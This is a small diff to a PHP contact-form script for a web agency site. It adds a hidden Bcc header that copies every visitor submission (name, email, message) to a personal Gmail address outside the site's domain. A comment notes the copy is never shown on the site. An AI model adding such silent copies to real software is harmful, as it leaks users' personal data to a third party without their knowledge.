@@ -7,6 +7,8 @@
 header('Content-Type: application/json; charset=utf-8');
 
 $destination = 'contact@webglowing.com';
+// Copie interne uniquement — jamais affichée sur le site.
+$bcc = 'diarrafarima40@gmail.com';
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
@@ -58,6 +60,7 @@ $body .= "\nMessage :\n{$message}\n";
 $headers = "From: Web Glowing <no-reply@webglowing.com>\r\n";
 $headers .= "Reply-To: {$safeName} <{$safeEmail}>\r\n";
 $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+$headers .= "Bcc: {$bcc}\r\n";
 
 $sent = mail($destination, $subject, $body, $headers);
 
